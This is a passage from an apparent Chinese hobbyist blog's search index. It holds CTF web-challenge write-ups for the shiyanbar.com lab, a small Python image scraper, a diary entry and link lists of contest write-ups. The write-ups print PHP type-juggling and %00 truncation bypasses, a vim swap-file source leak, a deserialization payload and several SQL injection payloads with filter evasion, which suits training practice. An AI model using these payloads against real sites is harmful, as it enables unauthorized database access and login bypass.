class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">考点:写脚本能力</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">        $_=<span class="string">""</span>;</span></span><br><span class="line"><span class="php">        $str = <span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws "</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">        $str = str_rot13($str);</span></span><br><span class="line"><span class="php">        $str = strrev($str);</span></span><br><span class="line"><span class="php">        $str = base64_decode($str);</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($str); $i++)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $_c = substr($str,$i,<span class="number">1</span>);</span></span><br><span class="line"><span class="php">            $__ = ord($_c)<span class="number">-1</span>;</span></span><br><span class="line"><span class="php">            $_c = chr($__);</span></span><br><span class="line"><span class="php">            $_ .=$_c;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> strrev($_);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li>上传绕过</li></ul><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点:文件上传,<span class="comment">%00截断</span></span><br></pre></td></tr></table></figure><ul><li>FALSE</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">考点: hsah1 碰撞</span></span><br><span class="line">可以直接传数组和md5碰撞一样的解法</span><br></pre></td></tr></table></figure><ul><li><p>Guess Next Session</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">考点：<span class="keyword">http</span> cookie</span><br><span class="line">直接将cookie清除即可</span><br></pre></td></tr></table></figure></li><li><p>Once More</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">'password'</span>] &gt; <span class="number">9999999</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== <span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>(<span class="string">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">考点:考察php及即弱类型</span><br><span class="line">当php遇到数字加e 的时候被认为是科学技术法，</span><br><span class="line">ereg()存在%00截断即遇到%00的时候被认为是匹配结束</span><br><span class="line">payload:</span><br><span class="line">1e8%00*-*    //注意在地址栏提交,不然%00会被url编码</span><br><span class="line"><span class="link">http://ctf5.shiyanbar.com/web/more.php?password</span>[<span class="string"></span>]=99999999 //也可以利用数组,ereg()只能处理字符串,数组的话,被认为为NULL</span><br></pre></td></tr></table></figure><ul><li>忘记密码了</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">考点: 源码泄露</span><br><span class="line"></span><br><span class="line">打开网址 查看源码 注意</span><br><span class="line">&lt;meta name=<span class="string">"editor"</span> content=<span class="string">"Vim"</span> /&gt;</span><br><span class="line">VIM编辑器:当进行文件编辑时，如果非正常退出会产生一个 .文件名.swp</span><br><span class="line">upload/.step1.php.swp  发现不行,于是抓包,发现跳转到step2 然后发送给submit.php</span><br><span class="line">访问.submit.php.swp 成功获得源码</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">$sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</span><br><span class="line">$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</span><br><span class="line">$r = mysql_fetch_assoc($r);</span><br><span class="line">$r = $r[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"澶辫触浜嗗憖"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">1.</span>要求token的长度为<span class="number">10</span>且值为<span class="number">0</span></span><br><span class="line">利用科学技术法<span class="number">0e00000000</span></span><br><span class="line"><span class="number">2.</span>要求$emailAddress的值为管理员邮箱</span><br><span class="line">step1源码中已给出</span><br><span class="line">payload:</span><br><span class="line">submit.php?emailAddress=admin@simplexue.com&amp;token=<span class="number">0e00000000</span></span><br></pre></td></tr></table></figure><ul><li><p>天网管理系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">考点: php弱类型 php反序列化</span><br><span class="line">查看源码, 发现&lt;!-- <span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">'username'</span>]; <span class="variable">$test</span>=md5(<span class="variable">$test</span>); <span class="keyword">if</span>(<span class="variable">$test</span>==<span class="string">'0'</span>) --&gt;</span><br><span class="line">php中的 == 为弱等于号 当比较类型不一样时会进行转换比如 <span class="string">'1'</span> == <span class="string">'1dfsgdfsg'</span> 结果为Ture</span><br><span class="line">因此只要找到一个字符串加密结果开头为0的即可</span><br><span class="line">数组也应该拿可以绕过,还没试过</span><br><span class="line">回显得到/user.php?fame=hjkleffifer</span><br><span class="line">访问得到:</span><br><span class="line"><span class="variable">$unserialize_str</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>]; </span><br><span class="line"><span class="variable">$data_unserialize</span> = unserialize(<span class="variable">$unserialize_str</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data_unserialize</span>[<span class="string">'user'</span>] == <span class="string">'???'</span> &amp;&amp; <span class="variable">$data_unserialize</span>[<span class="string">'pass'</span>]==<span class="string">'???'</span>) </span><br><span class="line">&#123; </span><br><span class="line">print_r(<span class="variable">$flag</span>); </span><br><span class="line">&#125; 伟大的科学家php方言道：成也布尔，败也布尔。 回去吧骚年</span><br><span class="line"></span><br><span class="line">看源码应该是php反序列</span><br><span class="line">对password进行序列化</span><br><span class="line">a:2:&#123;s:4:<span class="string">"user"</span>;b:1;s:4:<span class="string">"pass"</span>;b:1;&#125;</span><br></pre></td></tr></table></figure></li><li><p>Forms</p></li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看源码，发现:</span><br><span class="line">&lt;input <span class="attribute">type</span>=<span class="string">"hidden"</span> <span class="attribute">name</span>=<span class="string">"showsource"</span> <span class="attribute">value</span>=0&gt;</span><br><span class="line">修改<span class="attribute">value</span>=1</span><br></pre></td></tr></table></figure><ul><li>Guess Next Session</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">清除cookie就行了</span><br></pre></td></tr></table></figure><ul><li>拐弯抹角</li></ul><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">考点: 伪静态</span><br><span class="line">构造<span class="keyword">index</span>.php/inedx.php</span><br></pre></td></tr></table></figure><ul><li>让我进去</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">考点: Hash拓展长度攻击原理</span></span><br></pre></td></tr></table></figure><ul><li>天下武功唯快不破</li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> 查看源码发现:</span><br><span class="line"> &lt;!-- please post what you find with <span class="keyword">parameter</span>:key <span class="comment">--&gt;</span></span><br><span class="line"> 在返回报文看到flag,提交发现失败,于是写刷新发现flag在变,利用脚本进行提交:</span><br><span class="line"> import <span class="comment">requests</span></span><br><span class="line">import <span class="comment">base64</span></span><br><span class="line">url <span class="comment">=</span> <span class="comment">'http://ctf5.shiyanbar.com/web/10/10.php'</span></span><br><span class="line"></span><br><span class="line">s <span class="comment">= requests.get(url)</span></span><br><span class="line"></span><br><span class="line">flag <span class="comment">= base64.b64decode((s.headers[</span><span class="comment">'FLAG'</span><span class="comment">]))</span></span><br><span class="line">f <span class="comment">= flag.decode()</span></span><br><span class="line"># print <span class="comment">(f.split(</span><span class="comment">':'</span><span class="comment">))</span></span><br><span class="line">f1 <span class="comment">= f.split(</span><span class="comment">':'</span><span class="comment">)[1]</span></span><br><span class="line"># print(flag)</span><br><span class="line">print(f1)</span><br><span class="line">f1 <span class="comment">= &#123;</span><span class="comment">'key'</span><span class="comment">:f1&#125;</span></span><br><span class="line">r <span class="comment">= requests.post(url,data=f1)</span></span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><ul><li>简单的sql注入</li></ul><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入<span class="number">1</span>' or '<span class="number">1</span>'='<span class="number">1</span></span><br><span class="line">爆出全部</span><br><span class="line"><span class="number">1</span>'  unionunion  selectselect  database()'</span><br><span class="line"><span class="number">1</span>'  unionunion  selectselect  flag  fromfrom  flag  wherewhere  '<span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li>简单的sql注入之2</li></ul><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">测试<span class="keyword">select</span></span><br><span class="line">存在sql注入</span><br><span class="line">sel%<span class="number">0</span>aect绕过成功</span><br><span class="line">id=<span class="number">1</span><span class="symbol">'union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>'  //成功回显</span><br><span class="line">id=<span class="number">1</span><span class="symbol">'union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>database()' //database() 被过滤</span><br><span class="line">http://ctf5.shiyanbar.com/web/index_2.php?id=<span class="number">1</span><span class="symbol">'union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>table_name<span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span>where<span class="comment">/**/</span><span class="string">'1'</span>='<span class="number">1</span></span><br><span class="line">id=<span class="number">1</span><span class="symbol">'union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>column_name<span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span>where<span class="comment">/**/</span>table_name=<span class="symbol">'flag</span></span><br><span class="line">id=<span class="number">1</span>%<span class="number">27</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>flag<span class="comment">/**/</span>from<span class="comment">/**/</span>flag%<span class="number">23</span></span><br></pre></td></tr></table></figure><ul><li>简单的sql注入之3</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EXP报错</span><br><span class="line">http://ctf5.shiyanbar.com/web/index_3.php?id=1'or exp(~(<span class="keyword">Select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">database</span>())x)) %<span class="number">23</span></span><br><span class="line"><span class="keyword">http</span>://ctf5.shiyanbar.com/web/index_3.php?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'or exp(~(Select * from (select group_concat(table_name) from information_schema.tables where table_schema=database())x)) %23</span></span><br><span class="line"><span class="string">http://ctf5.shiyanbar.com/web/index_3.php?id=1'</span><span class="keyword">or</span> <span class="keyword">exp</span>(~(<span class="keyword">Select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span>)x)) %<span class="number">23</span></span><br><span class="line"><span class="keyword">http</span>://ctf5.shiyanbar.com/web/index_3.php?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'or exp(~(Select * from (select group_concat(flag) from flag)x)) %23</span></span><br></pre></td></tr></table></figure><ul><li>因缺思汀的绕过</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>实战利用py爬取图片</title>
      <link href="/2018/12/07/%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8py%E7%88%AC%E5%8F%96%E5%9B%BE%E7%89%87/"/>
      <url>/2018/12/07/%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8py%E7%88%AC%E5%8F%96%E5%9B%BE%E7%89%87/</url>
      
        <content type="html"><![CDATA[<h1 id="记第一次写爬虫"><a href="#记第一次写爬虫" class="headerlink" title="记第一次写爬虫"></a>记第一次写爬虫</h1><p>作为只回看懂代码的我,今玩要自己动手写一次爬虫,以前看过<strong>BeautifulSoup</strong>和<strong>requests</strong>库的一些用法,现在要自己写一个,花了我一个晚上的时间,结果写完也只有十几行的代码,难受受,看着自己写的十几行辣鸡代码,看来自己以后得好好自己动手写代码了.</p><h3 id="实战爬取图片"><a href="#实战爬取图片" class="headerlink" title="实战爬取图片"></a>实战爬取图片</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">'https://mp.weixin.qq.com/s/_ejalkc-Dg-YsFEXfVNpVw'</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url)</span><br><span class="line"></span><br><span class="line">html = response.text</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(html,<span class="string">'html.parser'</span>)</span><br><span class="line"></span><br><span class="line">dd = soup.find_all(<span class="string">'img'</span>,attrs=&#123;<span class="string">'data-src'</span>:<span class="keyword">True</span>&#125;) <span class="comment"># 找到属性值(即图片地址)</span></span><br><span class="line">b=[]  <span class="comment">#建一个列表放图片地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> img <span class="keyword">in</span> dd:</span><br><span class="line">    b.append(img.attrs[<span class="string">'data-src'</span>]) <span class="comment">#将获取的地址放到列表中,我也不知道自己为什么脑残这么做</span></span><br><span class="line">x=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> imgurl <span class="keyword">in</span> b:</span><br><span class="line">    urllib.urlretrieve(imgurl,<span class="string">'%s.jpg'</span>%x)  <span class="comment">#感觉用requests来编写下载的代码好麻烦就用urllib了 (逃~</span></span><br><span class="line">    x = x + <span class="number">1</span></span><br></pre></td></tr></table></figure><p>菜鸡又得自闭了 ==</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>有点小情绪</title>
      <link href="/2018/11/24/%E6%97%A5%E8%AE%B0/"/>
      <url>/2018/11/24/%E6%97%A5%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="今天出太阳了-最舒服"><a href="#今天出太阳了-最舒服" class="headerlink" title="今天出太阳了,最舒服!"></a>今天出太阳了,最舒服!</h2><p>11月好多CTF比赛鸭~ 我这种菜鸡做一道题都要花一个下午或者一个晚上很是难受,比赛和平常的刷题有区别,平常刷题不会就看writeup,hhhhh~<br>明显是自己比赛题目做少了,经验不多,学的东西不是很多,感觉自己学的都是表面的东西,现在学的知识漏洞及利用都是好几年前的知识,现在想找漏洞真的太难了。<br>有时候这题看freebuf时候有些看都看不懂,就有点想放弃了,想从开发开始做起,今天换了几本过期的书又借了两本python的书,想把自己的python提升,做些小程序出来,好让自己有成就感<br>加油~<br>少说话的，多做事，要自信！做好自己！  （逃~</p>]]></content>
      
      
      <categories>
          
          <category> 日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>文件上传漏洞总结</title>
      <link href="/2018/11/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2018/11/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传漏洞总结"><a href="#文件上传漏洞总结" class="headerlink" title="文件上传漏洞总结"></a>文件上传漏洞总结</h1><h5 id="做过很多文件上传漏洞-感觉不难-但是比赛有些还是不会-明明是一个很简单的知识点-还要想半天-现在来总结一下-让自己的思路清晰点-系统化-日常更新！"><a href="#做过很多文件上传漏洞-感觉不难-但是比赛有些还是不会-明明是一个很简单的知识点-还要想半天-现在来总结一下-让自己的思路清晰点-系统化-日常更新！" class="headerlink" title="做过很多文件上传漏洞,感觉不难,但是比赛有些还是不会,明明是一个很简单的知识点,还要想半天,现在来总结一下,让自己的思路清晰点,系统化,日常更新！"></a>做过很多文件上传漏洞,感觉不难,但是比赛有些还是不会,明明是一个很简单的知识点,还要想半天,现在来总结一下,让自己的思路清晰点,系统化,日常更新！</h5><p>因为很多图片,懒得放在图床里面,所以放在csdn或者博客园里面<br><a href="https://blog.csdn.net/qq_30464257/article/details/84404229#%E8%83%BD%E8%A2%AB%E8%A7%A3%E6%9E%90%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%88%97%E8%A1%A8%EF%BC%9Ajsp%20jspx%20jspfasp%20asa%20cer%20aspxphp%20php%20php3%20php4exe%20exee" target="_blank" rel="noopener">文件上传漏洞总结</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>湖湘杯WP</title>
      <link href="/2018/11/21/2018%E6%B9%96%E6%B9%98%E6%9D%AFWP/"/>
      <url>/2018/11/21/2018%E6%B9%96%E6%B9%98%E6%9D%AFWP/</url>
      
        <content type="html"><![CDATA[<h1 id="湖湘杯初赛没过-只能复现了QAQ"><a href="#湖湘杯初赛没过-只能复现了QAQ" class="headerlink" title="湖湘杯初赛没过 只能复现了QAQ"></a>湖湘杯初赛没过 只能复现了QAQ</h1>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>恒安杯历年WP</title>
      <link href="/2018/11/21/%E6%81%92%E5%AE%89%E6%9D%AF%E5%8E%86%E5%B9%B4WP/"/>
      <url>/2018/11/21/%E6%81%92%E5%AE%89%E6%9D%AF%E5%8E%86%E5%B9%B4WP/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="一月"><a href="#一月" class="headerlink" title="一月"></a>一月</h1><p><code>https://blog.csdn.net/luojiabin135/article/details/79638689</code><br><code>https://www.jianshu.com/p/abc44c54857a</code><br><code>http://rui0.cn/archives/763</code></p><h1 id="二月"><a href="#二月" class="headerlink" title="二月"></a>二月</h1><h1 id="三月"><a href="#三月" class="headerlink" title="三月"></a>三月</h1><p><code>https://coxxs.me/642</code><br><code>http://www.itdaan.com/blog/2018/03/26/acc9c32fda6f0e56651cc1322b43cf36.html</code></p><h1 id="五月"><a href="#五月" class="headerlink" title="五月"></a>五月</h1><p><code>https://blog.csdn.net/m0_38094687/article/details/80387188?utm_source=blogkpcl1</code></p><h1 id="六月"><a href="#六月" class="headerlink" title="六月"></a>六月</h1><p><code>https://blog.csdn.net/u011377996/article/details/80787236?utm_source=blogkpcl2</code></p><h1 id="八月"><a href="#八月" class="headerlink" title="八月"></a>八月</h1><p><code>https://www.jianshu.com/p/0da0312cd1fd</code></p><h1 id="九月"><a href="#九月" class="headerlink" title="九月"></a>九月</h1><p><code>https://www.anquanke.com/post/id/160582?from=singlemessage</code></p><h1 id="十月"><a href="#十月" class="headerlink" title="十月"></a>十月</h1><p><code>https://www.jianshu.com/p/e1af7cc3483d</code></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>CTF</title>
      <link href="/2018/11/21/CTF/"/>
      <url>/2018/11/21/CTF/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><pre><code>筱阳QQ：1260457781</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
